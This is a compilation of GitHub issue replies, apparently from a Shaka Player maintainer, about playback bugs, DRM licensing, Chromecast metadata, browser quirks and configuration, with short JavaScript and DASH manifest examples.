cherry-picking things.  Whoops.  Enjoy!. Okay.  Sorry I wasn't able to get to this fast enough to be helpful.  We are going to be working toward v2.5 very soon, and #999 is at the top of my agenda for that release.. @grantg182, I admit, I'm not sure what this could be.  I am having trouble following some of the details.  Let me see if I can ask some clarifying questions:\n\nYour license server does not have access to the open internet, correct?\nAre you trying to set up some kind of self-contained, isolated network that can still give out content licenses locally?\nYour license server is not a Widevine license server proxy, correct?\nWhat network traffic is sent by the browser?\nAre there any connections attempted from the browser out to the internet?\nWhat network traffic is sent by the license server?\nAre there any connections attempted from the server out to the internet?\n\nThanks!. @grantg182, I admit, I'm not sure what this could be.  I am having trouble following some of the details.  Let me see if I can ask some clarifying questions:\n\nYour license server does not have access to the open internet, correct?\nAre you trying to set up some kind of self-contained, isolated network that can still give out content licenses locally?\nYour license server is not a Widevine license server proxy, correct?\nWhat network traffic is sent by the browser?\nAre there any connections attempted from the browser out to the internet?\nWhat network traffic is sent by the license server?\nAre there any connections attempted from the server out to the internet?\n\nThanks!. I think this is something going wrong at the Android OS layer.  If the browser is not making any network request, then this is not something Shaka Player can control.\nIt's possible that there is some provisioning step needed by the Android CDM, and that it happens outside of the control of the JavaScript application.  I don't know for sure, though.\nI will try to ask a colleague who works on Chrome and see if they have any insight.. I think this is something going wrong at the Android OS layer.  If the browser is not making any network request, then this is not something Shaka Player can control.\nIt's possible that there is some provisioning step needed by the Android CDM, and that it happens outside of the control of the JavaScript application.  I don't know for sure, though.\nI will try to ask a colleague who works on Chrome and see if they have any insight.. According to my colleague, what is happening is that MediaDrm requests that the device be provisioned, and Chrome handles the provisioning request under the hood.  This request goes to a central address, which is not accessible on your network.\nSo the next question should be: Why does the device need to be provisioned again?\nI don't know enough about MediaDrm to speculate, but I believe the answer lies there.  Shaka Player talks to Chrome, which talks to MediaDrm.  MediaDrm asks Chrome to send a provisioning request, but I don't know how MediaDrm decides that.  Hopefully you can find the answer in the MediaDrm docs.\nI will leave this marked as \"external\" for now (to indicate a problem outside Shaka Player) and rename the issue to reflect what we've learned so far.  Please let us know what you find about MediaDrm, and please let us know if we can do anything more to help.. According to my colleague, what is happening is that MediaDrm requests that the device be provisioned, and Chrome handles the provisioning request under the hood.  This request goes to a central address, which is not accessible on your network.\nSo the next question should be: Why does the device need to be provisioned again?\nI don't know enough about MediaDrm to speculate, but I believe the answer lies there.  Shaka Player talks to Chrome, which talks to MediaDrm.  MediaDrm asks Chrome to send a provisioning request, but I don't know how MediaDrm decides that.  Hopefully you can find the answer in the MediaDrm docs.\nI will leave this marked as \"external\" for now (to indicate a problem outside Shaka Player) and rename the issue to reflect what we've learned so far.  Please let us know what you find about MediaDrm, and please let us know if we can do anything more to help.. I'm unable to reproduce this in our demo app:\nhttps://shaka-player-demo.appspot.com/demo/#asset=https://yt-dash-mse-test.commondatastorage.googleapis.com/media/car-20120827-manifest.mpd;lang=en-US;build=uncompiled\nThis leads me to expect that it's something specific to your app or your wrapper.\nI notice that you are explicitly calling unload(), and also not waiting on unload() to complete.  unload() is an async method that returns a Promise.\nBut you shouldn't have to call unload() explicitly at all, since that is implied by a subsequent load() call.  You can simply call load() again without unloading it first.  What happens in your app if you drop the unload() call?. It could be a bug.  We are supposed to tolerate all manner of calling patterns between load/unload/destroy. \n With the caveat that after destroy, nothing else can be called, there's no need to necessarily wait between load/unload/destroy, and they can be called multiple times.\nWe have a bunch of automated tests to verify this, but it's possible we have a regression that the tests don't catch.\nLet me see if I can reproduce it by mimicking your code above.. I'm fascinated that you're building a polymer element for Shaka!  I think that's really cool.\nI can't reproduce the issue, though, in a standalone app.  I started with our basic usage tutorial, and I tried adding all the same things (except requestAnimationFrame) that you had in the broken commit:\n```js\nasync function initPlayer() {\n  // Create a Player instance.\n  var video = document.getElementById('video');\n  var player = new shaka.Player(video);\n// Attach player to the window to make it easy to access in the JS console.\n  window.player = player;\n// Listen for error events.\n  player.addEventListener('error', onErrorEvent);\nconsole.log('PROBE 1');\n  support = await shaka.Player.probeSupport();\n  console.log(support);\nconsole.log('LOAD 1');\n  try {\n    player.load(manifestUri);\n  } catch (error) {\n    onError(error);\n  }\nawait delay(5);\nconsole.log('UNLOAD');\n  video.pause();\n  video.src = '';\n  player.unload();\nconsole.log('PROBE 2');\n  support = await shaka.Player.probeSupport();\n  console.log(support);\nconsole.log('LOAD 2');\n  try {\n    await player.load(manifestUri);\n  } catch (error) {\n    onError(error);\n  }\n}\n```\nDid I miss something?. Also, I noticed that you're doing this in the working version on each new load:\njs\n    const support = await shaka.Player.probeSupport();\n    const manifest = support.manifest.mpd ? dashManifest : hlsManifest;\nYou shouldn't need to call probeSupport().  It's a method that may cause user prompts while probing DRM support, and the manifest support you're checking for is decided at compile time.  So if you are using a standard build of Shaka Player, or if you've customized it in a way that has both DASH and HLS, you know ahead of time what manifest types are supported.\nEven if you're using did need to use probeSupport() to check for browser support for various DRM systems and codecs, you can still cache that result across playbacks.  It won't change during the life of the page.. There is no need to use probeSupport() for DASH support if you control the build of Shaka Player that is loaded.  DASH & HLS support are determined at compile time, and are both on by default.. Instead of UA parsing, use shaka.Player.isBrowserSupported() as @TheModMaker suggests.  If that returns true, you can pass either DASH or HLS, whichever you prefer.. Tentatively scheduled for v2.5. This turns out to be fixed by the same fix for #1597 (a fudge factor applied to the append window end). If the source content is muxed (audio+video in the same segment), I believe Shaka Player would create a single SourceBuffer for audio+video content.  If the source content is demuxed (audio and video in separate segments), then we would create two SourceBuffers: one for video, one for audio.\nSo it is the content creator who decides how many SourceBuffers there are by deciding whether or not to separate audio & video segments.  Industry best practice seems to be to separate audio & video, and we recommend this, as well.\nBrowsers tend to stall when there is a gap.  A gap is defined by the intersection of the buffered ranges of all SourceBuffers. If there are two SourceBuffers, and either one is missing some content at a given point, that's a gap.  If there is only one SourceBuffer, any missing content in it is obviously a gap.\nBrowsers will play through \"small\" gaps, but each browser defines \"small\" differently.  Shaka Player has a feature called \"gap jumping\", which you can configure to application preferences.  In short, if we find a gap in the content, we will seek to jump over it.  You can tell us whether to jump over small gaps or all gaps, and you can define what \"small\" means.  See our docs on StreamingConfiguration, specifically the \"smallGapLimit\" and \"jumpLargeGaps\" fields.  Here's an example of setting them:\njs\nplayer.configure({\n  streaming: {\n    smallGapLimit: 2.0,  // seconds\n    jumpLargeGaps: true,  // if true, small gap limit doesn't matter\n  },\n});\nIf, hypothetically, we were to generate a blank audio chunk, it would have to be encoded with the same codec as the playing content and contained in the same container.  So that would mean, for example, generating valid AAC data and wrapping it in a valid fMP4 segment with the correct timestamps and other parameters to fit seamlessly into MSE's SourceBuffer.  This is not something reasonable for Shaka Player to do, in my opinion.  We would have to support many combinations of codecs & containers, and even doing it for AAC+fMP4 is unreasonable for a JavaScript application.\nHopefully the explanation of the SourceBuffer situation will help with content creation, and hopefully the gap-jumping feature will help deal with the gaps that inevitably appear in some live content.\nThanks!. Some content providers are moving toward having PSSHs in the manifest only, and not in the content.  This would explain the lack of 'encrypted' event.\nHas MediaKeys been attached to the video element?  If MediaKeys has been attached to the video element, I would expect the browser to stop when it found encrypted content with no matching key.  But perhaps Edge doesn't behave like others.. The XML namespace fix will appear in v2.3.8 and v2.4.0 this week.. Done.  Thanks!. :tada: Github calls that the \"hooray\" reaction, or the \"tada\" emoji, but I prefer to think of it as a vuvuzela. :tada:. Cherry-picked for v2.3.9 and v2.4.1.. It seems that with this change, nothing would be imported at all.  Is that intended?  Why?. I see.  I think, though, that it might be a little misleading if the import fails silently.  What if we import to global instead of window?. For example, instead of checking typeof window === \"object\" at the top to decide to call the wrapper function, what if you changed call(window) at the bottom to call(typeof window === \"object\" ? window : global)?  Would that work for you?. Great, thanks!. The build bot is testing the change now.  If all the tests pass, I would be happy to merge this and cherry-pick it for v2.4.1.  Thank you for contributing!. Actually, it's trivial enough that I could also cherry-pick to v2.3.x in case we do another release from that branch.. Cherry-picked for v2.3.9 and v2.4.1.. Hi @FeliceGeracitano.  We are planning to wrap Safari's native HLS player to support com.apple.fps.1_0.  This will allow applications to use Shaka Player on iOS, but as Chris points out, very little of Shaka's config will have any effect on iOS.  The goal with that is just to make things a little simpler, so that apps don't have to write two different sets of logic for iOS and for everything else.  This is tracked in #997 (native HLS) and #382 (FairPlay).\nI would love to support FairPlay on top of MSE on Safari, which would be com.apple.fps.2_0 and would allow Shaka Player to handle DASH & HLS without using Apple's native HLS implementation.  This doesn't seem to be officially supported by Apple yet, and I was unable to make it work the last time I tried it (about one year ago, June 2017).  There is a long discussion in #382 about whether or not this approach is even feasible, but @chrisfillmore made some progress in PR #1199, which I have not had time to review or test in detail.\nDoes this answer your question?. My pleasure.  Sorry we didn't get you the answers sooner.. Cherry-picked for v2.3.9 and v2.4.1.. Filed upstream against mux.js: https://github.com/videojs/mux.js/issues/194. We think the mux.js bug can be worked around in Shaka Player, effectively converted from a hang into an error, without us waiting for the bug to fixed upstream.  We consider that an improvement, but mux.js will ultimately have to fix the bug.. Setting 'remux': false doesn't fix it.  Instead, I get a MediaSource error from Chrome that says \"Initialization segment misses expected aac track\".  I will follow up with mux.js.. So far, there doesn't seem to be an easy way to fix this in Shaka Player.  I've tried a few things, but I've had no luck.  I'm hoping for more feedback from mux.js, and possibly a fix from them.  For now, this will stay marked as \"external\".\nFor a workaround that you can control @PrasannaLearnyst, could you demultiplex your TS content library?  This is something you might be able to try with one asset just for testing purposes, and if it works, you could consider what it would take to do that to your entire content catalog.. The workaround introduced by @ismena has been cherry-picked for v2.3.9 and v2.4.1.. The workaround suggested by mux.js would take serious rearchitecture in Shaka Player, which we don't have the resources to work on right now.  We are waiting for a fix from mux.js in https://github.com/videojs/mux.js/issues/194. @ronenneumark, have you had a chance to read the earlier replies from the team?  Is this helpful?  Is there anything else we can do for you?. Okay, great.  I'm going to go ahead and close the issue, then, but please feel free to let us know if it needs to be reopened.  Thanks!. @desenhista, I tried to reproduce the issue today, but I'm getting HTTP 403 errors.. I can see the issue now, but I've run out of time to work on it today.  I'll look again tomorrow and dig into why it is failing.. Yes, we have been discussing how to manage this.  We don't have a detailed design, but tentatively, we will make this dependent on background fetch (#879).  On platforms that support it, background fetch will allow us to move offline downloads to the service worker.\nBecause service workers can outlive the page and are shared among multiple tabs for the same origin, service worker downloads could help resolve some tricky issues with multiple tabs trying to resume the same download.\nWe haven't worked out the details, and we could be wrong, so this plan might still change.  Thanks!. Will do.. The issue appears in the release build, but not the debug build.\nTo dig into this, I started by examining the compiled code and looking for Symbol.  The debug and release builds both have this, but it looks a little different.\nI tried to put a breakpoint in the code, but IE was making that difficult and wouldn't let me see the compiled bundle, possibly because there was a source map.  The code that is breaking, though, was inserted by the compiler and doesn't map back to anything in the uncompiled library sources.\nTo better debug, I edited the compiled library and used http://jsbeautifier.org/ to format the first several lines of the compiled code, including the code that polyfills Symbol.  My plan was then to add console logs to help me debug it.\nWhile doing this, though, I noticed that only the release build uses a module wrapper.  I commented out the module wrapper, and the problem went away.  So it has something to do with the interaction between the Closure Compiler's inserted polyfill and our module wrapper.. The code inserted by the compiler doesn't work in a wrapper.  It does not appear to be our wrapper's fault.\nIn some places, the compiler-inserted code refers to $jscomp.global.Symbol (which works), and in others, it refers to Symbol (which only works without the wrapper or on browsers with native Symbol support).  This mistake appears in the definitions of $jscomp.makeIterator, $jscomp.generator.Generator_, and $jscomp.iteratorFromArray.  This bug appears to be present in the latest Closure Compiler sources.\nI will patch it locally in our pre-built compiler, then create a PR to send the changes to the Closure Compiler team.. Compiler patch: https://github.com/joeyparrish/closure-compiler/commit/ab6ead338d7a03f1caa335eae2de8e977b61c901. Cherry-picked for v2.3.9 and v2.4.1.. shaka.cast.CastProxy.prototype.setAppData is the right place to send metadata.  That is used on the sender side to communicate arbitrary metadata to the receiver.\nThe receiver gets that metadata via a callback.  When you construct a shaka.cast.CastReceiver object on the receiver side, you pass a callback to the appDataCallback parameter (optional 3rd parameter, after video and player).  That callback is invoked when the sender first connects, with whatever value was given to setAppData() before connecting.  While connected, the callback is invoked any time the setAppData method is used on the sender.\nDoes this help?\n(We have open issue #1142 for us to write a proper tutorial for Shaka Player on Chromecast.  I apologize that this isn't documented as well as it could be yet.). You can pass any JSON-serializable object, but not, say, a function or a DOM element.. We have special serialization support for TimeRanges objects, in lib/cast/cast_utils.js.  This could be extended for any reasonable thing you might need to send, except for code.  We wouldn't accept any change that used eval to get and execute JS code sent across the wire, because that would be inherently insecure.  For that sort of thing, it's best to have your receiver load any necessary code itself, independent of anything sent by the local browser.\nFor example, if some content required a certain request filter, but other content did not, the filter code would be part of both the sender (for local playback) and receiver (for remote playback).  The metadata you send across could contain a flag to indicate the need for the request filter, but not the request filter code itself.\nDoes that make sense?. Happy to help!  Please let us know if you need anything else.. The receiver app is controlled by the sender app, but that happens through proxied references to the video and player.  You use CastProxy to get those, and your UI talks to the proxies.  For example:\n```js\nconst localVideo = document.getElementById('video');\nconst localPlayer = new shaka.Player(localVideo);\nconst castProxy = new shaka.cast.CastProxy(localVideo, localPlayer);\nconst proxyVideo = castProxy.getVideo();\nconst proxyPlayer = castProxy.getPlayer();\n// only has an effect while you are playing locally:\nlocalVideo.pause();\n// affects the local video while playing locally, or the receiver while casting:\ncastVideo.pause();\n```\nYour app's UI should always be calling methods and setting properties on the proxied objects, not directly on the local ones.  The UI controls for \"pause\", for example, don't have to check whether or not you are casting.  The proxy will handle that for you and route the command appropriately.\nDoes that help?. > Another question, I'm sending my assets through setAppData but when I try to update receiver UI, it makes all crash (I mean no sound on the receiver).\n\nYou can check the receiver code here : https://github.com/Mathieu-R/streamwave-presentation in sw-presentation.js especially the method (initShakaPlayer() and metadataCallback (data)). The problematic line is the line 103 : this.updateUI(data).\n\nI'm sorry, I can't spend the time to debug your application.  Just glancing at your code, though, I see that you are doing this:\njs\n    this.receiver =  new shaka.cast.CastReceiver(\n        this.audio, this.player, this.metadataCallback);\nSo I'm going to guess that the unbound callback is the problem.  I think if you go to metadataCallback and log \"this\", you'll see it's not what you think.\nIn JavaScript, if you take a method from an object, like var cb = foo.method;, you end up with an unbound function.  Calling cb() invokes foo.method with this set to window.  If you stick that callback into another object, and call it that way, such as baz.cb = foo.method;  baz.cb();, it will invoke foo.method with this set to baz.\nIf you haven't seen this before, this is just an annoying/surprising part of the JavaScript language.\nThe solution is bind(), which attaches a specific this to the object.  For example, var cb = foo.method.bind(foo); cb(); will invoke foo.method with this set to foo.  The same is true here: baz.cb = foo.method.bind(foo); baz.cb();\nDoes that help?. No worries!  We all do it from time to time.. I don't see any reason why we couldn't parse it and send an event.  When would you expect the event to be fired?  When the master playlist is parsed?. In short, you can't develop your own Widevine license server.  Please send any further questions about running a Widevine license server directly to Widevine.  Thanks!. Can you load any of these Shaka Player demo app links in Electron?\nv2.4.0, uncompiled: https://shaka-player-demo.appspot.com/demo/#build=uncompiled\nv2.4.0, debug: https://shaka-player-demo.appspot.com/demo/#build=debug_compiled\nv2.4.0, release: https://shaka-player-demo.appspot.com/demo/#build=compiled\nnightly, uncompiled: https://nightly-dot-shaka-player-demo.appspot.com/demo/#build=uncompiled\nnightly, debug: https://nightly-dot-shaka-player-demo.appspot.com/demo/#build=debug_compiled\nnightly, release: https://nightly-dot-shaka-player-demo.appspot.com/demo/#build=compiled. This has been fixed in the master branch, and the fix will be cherry-picked to our next releases.  Sorry for the inconvenience!. Cherry-picked for v2.4.2.. Cherry-picked for v2.3.10.. Cherry-picked for v2.4.2.. To create a video from a sequence of images, you might try this guide: https://en.wikibooks.org/wiki/FFMPEG_An_Intermediate_Guide/image_sequence. Our history live stream is also generated from a pipe, and uses ffmpeg with the -re option.  I think that is a requirement for generating live streams from a pipe.. @kchandran1029, you may also want to try setting the 'streaming.jumpLargeGaps' config to true:\njs\nplayer.configure('streaming.jumpLargeGaps', true);\nFor some content, gaps that appear on one browser may not appear in another.  Perhaps your content manifests a gap on Safari, but not in Chrome or Firefox.  This is just a guess.. Here's what I saw in Safari 11.0.3 today:\n\nFollowing the instructions you sent privately, I am able to log in and start a channel.  The first frame shows, but the spinner stays up, and playback never begins.  Clicking the play button in the center of the screen does nothing.  If I use the debugger to save a reference to the player object, I find that player.isBuffering() returns false.\nDigging around in the console, with the video element stored in the variable video, I find that video.currentTime is inside a buffered range, but video.paused is true.  If I call video.play(), I get back a rejected Promise with this error message:\n\nNotAllowedError (DOM Exception 35): The request is not allowed by the user agent or the platform in the current context, possibly because the user denied permission.\n\nIf I click on the scrubber to seek, the video frame is updated to the new position, but I am unable to convince the video element to actually play anything.\nI finally realized that my clicks on the \"play\" button were going to the spinner instead.  In the \"Elements\" tab in the inspector, I set the spinner to display: none.  Then I was able to click the play button, which made playback begin.\n\nMy conclusion is that autoplay restrictions in Safari are preventing playback from starting automatically.  Only a click event will trigger playback, but your spinner is layered over the top of the play button, which prevents it from receiving clicks.  Furthermore, your spinner is displayed in spite of the fact that player.isBuffering() returns false.\nYou could probably fix all of this if you listened to the player's buffering event, and used that to show/hide the spinner.  This would get the spinner out of the way of the play button when playback could begin, and allow the user to click the button.\nSince this appears to be working from Shaka Player's point of view, I'm going to mark this issue \"working as intended\" and rename the issue to reflect that autoplay restrictions are the main culprit.\nDoes this help?. The EME API is used to manage licenses, both for streaming and offline storage.  This API does not require a video element to fetch a license, so that is how we are able to retrieve a license without playing the content.\nThe only requirement for fetching a license is the \"init data\", which is commonly an MP4 PSSH box.  As @TheModMaker points out, so long as a PSSH appears in the manifest, we have everything we need to store offline protected content (on supported browsers).. Reproducible in v2.4.0, v2.4.1, and nightly.  Not reproducible in v2.3.9.. Cherry-picked for v2.4.2.. First, I think we should evaluate whether or not the workaround is still necessary.  It would be ideal to be able to remove the hack completely instead of adjusting the tests.. We've never done any testing on Netfront, but that appears to be WebKit-based.  Of all the major browser implementations, Safari/WebKit gives us the most difficulty and seems to have the buggiest implementation of MediaSource.\nAlthough Netfront is not on our list of officially-supported platforms, we will do what we can to help.  We will not be able to provide any help debugging a platform we don't have, but we will try to advise you as you work through the issue, and we would be happy to review a pull request for any workaround you come up with.\nIt is often the case that fudge factors are needed to account for inaccuracies in timestamps in various parts of the system, so your workaround seems reasonable on the surface.  Does your \"- 0.1\" workaround work on all of your TV platforms?. In the mean time, there are APIs to select specific tracks, which is what a UI control for quality would call.  See getVariantTracks and selectVariantTrack in the docs.. I will add that licenses, as they appear over the wire, are only readable by the CDM (a content security component inside the browser) that requested the license.  Persistent licenses are stored securely by the CDM itself, and cannot be tampered with or transferred to other machines.\nDoes this help?. I think this is a duplicate of #666, which is a Firefox bug being discussed here: https://bugzilla.mozilla.org/show_bug.cgi?id=1312864\nCORS should work with redirects, but Firefox has not caught up to the spec.\nI'm going to close this as a duplicate now, but please feel free to subscribe to #666 or go to their buganizer and let Mozilla know that this issue is important to you.. Then it's possible that I was mistaken.  We will try to reproduce your issue and let you know what we find.. Sanitized details from the doc linked in the original post:\n\nManifest generation involves private tools (shared with us for repro).\nBrowser: reproduces in Firefox 62.0b3, not in Firefox 52 ESR\nA request for media segments resulted in a redirect.  The redirected URL was then subsequently blocked by the browser due to CORS (\"Same Origin Policy\").\nError logged by Firefox: Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at ...\nReason: CORS header \u2018Access-Control-Allow-Origin\u2019 does not match \u2018https://shaka-player-demo.appspot.com\u2019\nThis results in NETWORK.HTTP_ERROR at the Player level.\n\"Setting origin value to null in the redirect seems to solve cors issue.\". I am unable to reproduce the issue in Firefox 62.0b3.  Did you apply the workaround you mentioned in your doc?. I also tried the latest Firefox beta (62.0b7) and couldn't reproduce in that, either.. The other thing I'm confused about is the workaround itself.  You said \"Setting origin value to null in the redirect\", but origin is a request header, not a response header.  Can you clarify that?. @KameshDevarakonda, when this bug occurs, do you have any console logs in Firefox about the ServiceWorker?  In a similar issue (#1498), I found this error log in the console:\nA ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\nIf you see this, too, then I can consider the two issues to be the same, and work on a fix via #1498, which is easier for me to reproduce.. Since #1498 is easy for me to reproduce, I'm marking this one as a duplicate of that (even though this issue was filed first).\nWork on this issue will continue on #1498, and I'm hopeful that we can find a workaround at the very least.. This was found with the same content as #1478, but with a local change in the DASH parser to avoid creating new periods on each update.\nHere's an example of what we had:\nxml\n    <SegmentList presentationTimeOffset=\"221502\" startNumber=\"108\" timescale=\"1000\">\n      <SegmentTimeline>\n        <S d=\"2000\"/>\n        <S d=\"2000\"/>\n        <S d=\"2000\"/>\n      </SegmentTimeline>\n    </SegmentList>\nWhat I found while debugging was that SegmentIndex contains SegmentReferences with times 0, 2, and 4.  The structure representing the <SegmentList> element contains a field with the PTO, but that is kept outside the SegmentIndex object.  When we merge at the SegmentIndex level, we throw out the new refs.\nI'm suspicious that this might be bad content, though.  The timestamps in the SegmentTimeline should be the actual media times, correct?  PTO is meant to align those with the period, as I understand it.\nBut in this case, PTO changes when we update the manifest, and the segment times stay fixed.  So PTO is being used to adjust the fixed times to the actual media times.\nIs it fair to say this is abusing the way DASH is supposed to work?. Okay.  Thanks.  I'll mark this \"bad content\" and WAI as well.. @TheModMaker, thank you for pointing that out.  I will close as \"intended behavior\" and let the affected partner know that this is to be avoided in their manifests.. This change will be cherry-picked for v2.4.2.. Cherry-picked for v2.4.2.. Cherry-picked for v2.3.10.. We don't have a firm due date for v2.5.  The v2.5 milestone is currently 14% complete.  There are many major features still left to be completed, and I'm sure some of them will wind up getting bumped to another release.\nWe typically get out a minor release (v2.3, v2.4, etc) every 3 months or so.  The last minor release, v2.4, took 5.5 months.  At that time, we were short-staffed.\nDuring the v2.5 development cycle, the team is currently splitting their attention among multiple projects, so I would predict another slow cycle.  We are doing what we can to speed things up, of course, but we are only human.\nWhat features are you most eager to see in v2.5?. Thanks, everyone.  This is very helpful for planning.  I'll let you all know when we do our next round of planning.  I will try to decide definitively what we have time for in v2.5.. #382 is blocked by #816, which is a work in progress.  v2.5 milestone is currently 52% complete, and we just released v2.5.0-beta for those interested in the features we've landed so far.  Details can be found in the changelog.. #382 (FairPlay) depends on #816 (src=), because Apple only has documented support for FairPlay through src= on desktop & iOS Safari.  Without #816, there is no way for us to complete #382.  We apologize for the inconvenience.. Currently, #816 is schedule for v2.5.  You can see our scheduling in the \"milestone\" field of github issues.\nI understand this particular release cycle has been slow and may be frustrating to our users.  We are working to improve our release cadence.  To help our users make plans of their own and to help give our users a chance to see and influence our long-term plans, next year we will publish a longer-term roadmap in addition to our issues and milestones.. It's beginning to look a lot like January.\nWe'll continue to release v2.5 betas as we achieve meaningful progress through particular features.. Can you give some small sample code showing how you create the Blob URLs?  I want to be sure we're accurately reproducing your issue.  Thanks!. There are a few problems with this in today's Shaka Player:\n\nNo plugins are registered to handle blob: URIs.  This is tribial to fix by registering either XHR or Fetch to handle blobs: shaka.net.NetworkingEngine.registerScheme('blob', shaka.net.HttpFetchPlugin);\nWith blobs, neither extension nor MIME type can be used to deduce which manifest parser to use.  If only there were some way to append \".mpd\" to the URI without breaking it.  This is moderately annoying, but easy to fix with the manifestParserFactory argument of player.load: player.load(uri, null, shaka.dash.DashParser);\nRelative URIs in the manifest are broken because the original manifest URI is lost.  This can be worked around with either absolute URIs or the use of BaseURL element in DASH.\n\nWith those three problems worked around, I can verify that blob URIs would work in the latest release.  For now, I recommend you use these workarounds.\nFor the future, I will mark this as an enhancement on the backlog to make the use of Blob URIs easier.\nWe should:\n1. register scheme plugins to handle blob URIs\n2. have some easier way to specify the parser to use, such as passing a MIME type or extension string in place of a specific parser\n3. consider a parser configuration that would override the base for relative URIs found in a manifest. Also, it just occurred to me, since what you are doing only allows you to prefetch and cache the manifest contents, this might be obviated by our \"preload\" enhancement (#880), which would fetch both the manifest and the first segment ahead of time, to allow very low-latency startup.  You should subscribe to that issue if you are interested.. Chrome stable is currently 67.  I don't think we'll be able to actively support what is essentially a fork of Chrome that is 8 releases out of date.  My advice is to push Castlabs to update: https://github.com/castlabs/electron-releases/issues/new\nThe latest from Castlabs is based on Electron v1.8.7, which is in turn based on Chrome 59.\nSince then, Electron has released v2.0.0, which upgraded to Chrome 61, and v3.0.0-beta.3, which upgraded to Chrome 66.  The latest beta from Electron is only behind Chrome by a few weeks.. Gotcha.  Thanks!. @grantg182, have you tried configuring a timeout in the player's retryParameters?  By default there is no timeout.  See https://shaka-player-demo.appspot.com/docs/api/tutorial-network-and-buffering-config.html. Sorry I overlooked that in your original post!\nThe maxAttempts parameter will control how many attempts are made (including the first attempt).  But without the timeout parameter, the JavaScript application has no control over when a failure occurs.  You should definitely set the timeout parameter, which defaults to 0 (no timeout).  With a timeout set, you are in control over how long a transfer may take before it is aborted.. I did a quick repro from my Chromebook and found MEDIA.VIDEO_ERROR with \"CHUNK_DEMUXER_ERROR_APPEND_FAILED: video frame with PTS 1000us has negative DTS -65667us ...\"\nSomeone should try it in Firefox as well, plus Chrome with the flags --user-data-dir=/tmp/user-data-dir --enable-features=MseBufferByPts.  If it works in Firefox and if it works in Chrome with the flag, it's a known Chrome bug with a fix coming soon.. There is no way for us to ignore the error and continue, because it is the browser itself which is responsible for playback and interpretation of the media segments.  I apologize for the inconvenience, but unless a workaround can be discovered to avoid the error in the first place, there is nothing we can do.  The error comes from the browser itself and is not recoverable.. It could have to do with the way we offset content through MediaSource.  If we did that differently, it wouldn't trigger the Chrome bug.\nWhile we could do things differently, I don't have the resources to change a major architectural decision to work around a browser bug that has already been fixed (behind a flag) by the browser.  When Chrome changes the default for that flag, you will see the browser bug fixed.\nI'm trying to track down a specific release date from Chrome team.. I believe the Chrome bug fix is being released to everyone in Chrome 70.  This release should be out in a about 2 weeks.. I stand corrected.  Thank you!. I believe the Chrome DTS/PTS bug has now been fixed, so I'm closing this bug. If you still have issues with the latest stable release of Chrome, please file a new issue. Thanks!. We'll take a look.  Thanks!. Yes, that's exactly right.  They are used to generate saner version numbers for master branch builds.  This was part of the fix for #1420, although most of the changes took place in our release and tagging process rather than in the code itself.\nBefore that change, master builds would say something like v2.3.0-158-blah, up until v2.4.0.  There was no way to see that the most recent release had been, say, v2.3.8, and that the master branch build was more closely related to that or v2.4.0 than v2.3.0.  Now that we tag the master branch at each release, that tag is what shows up in master branch builds, which is arguably more informative.. We will need usable manifest URIs to reproduce the bug, not just attachments.  If you can't post them publicly, please send the URIs to shaka-player-issues@google.com instead.  There was a note about this in the issue template.\nIf you have a publicly accessible manifest URI, you can copy the URI of the demo app after loading to send us the exact asset, licence server, and settings you have selected there.. Unfortunately, we can't diagnose anything if you can't give us a way to reproduce the bug.  Is there anything you can do to provide us with content?. Sounds reasonable.  I'll schedule it.. We would be happy to take a pull request for this, if you're interested.  It should be quick and easy.. Looks good, but can you please update CONTRIBUTORS and AUTHORS as well?  There are notes at the top about how to do that, but please make sure to keep them alphabetized.  Thanks!. I'm just going to have the build bot check it out.  It's not doing anything magical, so it if it reports any failures, just run build/all.py and build/test.py locally to reproduce.  If all the tests pass, I'll merge it.. Looks like one test needs updating.  You can check results locally with build/all.py (to lint and compile everything) and build/test.py (to run the tests).  Thanks!. Thanks for your contribution!. I don't know the answer off-hand, but I'm looking into this now.. @sergioavazquez, I've added the \"help wanted\" tag to indicate that we would be happy to review a pull request for this feature.  Please read CONTRIBUTING.md for details.  Thanks!. @jkringen, your content manifest shows PlayReady, but no other key systems.  Does your WebKit-based browser have PlayReady?\nTry navigating to https://shaka-player-demo.appspot.com/support.html in your browser, which will output the full contents of Shaka's support probe.  Copy the text or take a screenshot so that we can see what we can detect as supported on the device.. If com.microsoft.playready doesn't show up as supported, I would guess that either:\n\nThey use some other, non-standard key system ID (you should ask)\nor they don't support PlayReady through EME (you should ask about this, too)\n\nTo see if decryption & playback of encrypted content would work at all, you should try the clearkey implementation.  Check out the \"Clear Key\" section of our DRM tutorial: https://shaka-player-demo.appspot.com/docs/api/tutorial-drm-config.html. This is because you have no suggestedPresentationDelay attribute in your manifest, combined with a timeShiftBufferDepth of 10s.  timeShiftBufferDepth of 10s means that only 10s of content is accessible to the client at a time.\nTo compensate for the time it takes clients to get started, you use the suggestedPresentationDelay attribute in DASH.  Your manifest doesn't have one specified, so we default to 10s.  You can change this default through configuration.  For example:\njs\nplayer.configure('manifest.dash.defaultPresentationDelay', 30);\nThe effect of presentation delay is that the live edge of taken backward by that amount.  So for 10s, the live edge is 10s behind the content available on the server.  This means the client can buffer 10s ahead of what it can play.\nHowever, since your timeShiftBufferDepth is only 10s, that means that only 10s of content is available, and playback happens at the left edge of that range.  Your timeShiftBufferDepth should be larger than your presentation delay.\nIn the latest code on master, both of these parameters can be tuned through configuration.  (Subject to us fixing the bug we just discovered in #1177.)  Here's an example that works well for your stream with Chrome's \"Fast 3G\" network emulation:\njs\nplayer.configure({\n  manifest: {\n    availabilityWindowOverride: 20,\n    dash: {\n      defaultPresentationDelay: 10\n    }\n  }\n});\nWith that config and the fix for #1177 (out soon), your content can be played.  You could also fix this by tweaking your manifest like so:\nxml\n<MPD\n  xmlns=\"urn:mpeg:dash:schema:mpd:2011\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns:cenc=\"urn:mpeg:cenc:2013\"\n  profiles=\"urn:mpeg:dash:profile:isoff-live:2011\"\n  type=\"dynamic\"\n  availabilityStartTime=\"1970-01-01T00:00:00Z\"\n  publishTime=\"2018-07-20T17:57:05Z\"\n  minimumUpdatePeriod=\"PT2S\"\n  maxSegmentDuration=\"PT2.006S\"\n  minBufferTime=\"PT6S\"\n  timeShiftBufferDepth=\"PT20S\"\n  suggestedPresentationDelay=\"PT10S\">. The Cast Application Framework uses Shaka Player internally for DASH.  I'm not sure if you are using that or not.  You can also build custom cast receivers based on Shaka Player.. Thanks for letting us know!. Sure, no problem.  I'll create a \"TV/STB\" label we can use for that.. 